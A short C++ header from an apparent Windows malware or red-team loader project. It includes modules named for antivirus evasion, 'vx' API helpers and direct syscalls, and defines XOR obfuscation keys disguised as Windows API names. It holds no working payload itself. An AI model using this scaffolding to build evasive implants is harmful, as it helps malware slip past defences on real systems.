#pragma once
#include <Windows.h>
#include <vector>
#include <iostream>

#include "helpers.h"
#include "evaders.h"
#include "vxapi.h"
#include "crypto.h"
#include "networking.h"
#include "syscalls.h"

#define _CRT_SECURE_NO_WARNINGS
#pragma warning(disable:4996)

const unsigned char xorKey[] = "ConvertDefaultLocale";
const unsigned char xorKey2[] = "IsDialogMessageW";